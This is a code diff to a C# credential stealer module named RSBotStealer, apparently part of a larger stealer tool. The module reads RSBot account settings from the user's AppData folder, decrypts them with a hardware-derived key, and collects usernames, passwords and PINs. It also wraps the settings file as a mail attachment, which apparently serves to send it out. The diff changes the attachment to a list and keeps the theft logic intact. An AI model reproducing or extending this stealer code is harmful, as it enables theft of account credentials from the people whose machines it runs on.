@@ -3,11 +3,8 @@
 using System;
 using System.Collections;
 using System.Collections.Generic;
-using System.Globalization;
 using System.IO;
-using System.Management;
 using System.Net.Mail;
-using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -21,20 +18,21 @@ namespace sub.Stealers
     {
         private const string SettingsFileName = "RSBot_Accounts.ini";
 
+        private List<Attachment> _attach;
+
+        private string _name = "RSBotStealer";
+
         private string _settingsFile = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
 
         #region IStealer Members
 
-        private Attachment _attach;
-
-        public Attachment Attachment
+        public List<Attachment> Attachments
         {
             get { return _attach; }
             set { _attach = value; }
         }
 
-        private string _name = "RSBotStealer";
         public string Name
         {
             get { return _name; }
@@ -47,13 +45,12 @@ namespace sub.Stealers
         {
             if (!File.Exists(_settingsFile))
                 return;
+            _attach = new List<Attachment> {new Attachment(_settingsFile)};
             IEnumerable<RSBotAccount> accounts = GetLocalAccounts(HardwareInfo.GetLocalKey());
-            Data += "RSBot Account Stealer\r\n\r\n";
             foreach (RSBotAccount acc in accounts)
             {
                 Data += "Username: " + acc.UserName + ", Password: " + acc.Password + ", Pin: " + acc.Pin + "\r\n";
             }
-            _attach = new Attachment(_settingsFile);
         }
 
         #endregion
